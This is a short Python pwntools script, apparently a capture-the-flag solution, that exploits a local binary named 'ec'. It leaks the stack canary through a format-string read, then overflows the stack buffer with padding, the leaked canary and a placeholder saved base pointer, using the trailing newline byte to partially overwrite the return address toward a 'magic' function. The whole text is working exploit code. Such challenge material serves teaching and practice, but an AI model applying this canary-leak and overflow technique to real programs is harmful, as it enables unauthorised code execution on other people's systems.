#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./ec')

padding = 'a'*104

r.sendline('%25$p')
canary = int(r.recvuntil('\n')[:-1],16)

'''
the char '\n' is '0x0a' exactly made return address overflow to magic!!
'''
# | padding | canary | old rbp | return address | 
r.sendline(padding + p64(canary) + p64(0xdeadbeef))

r.interactive()
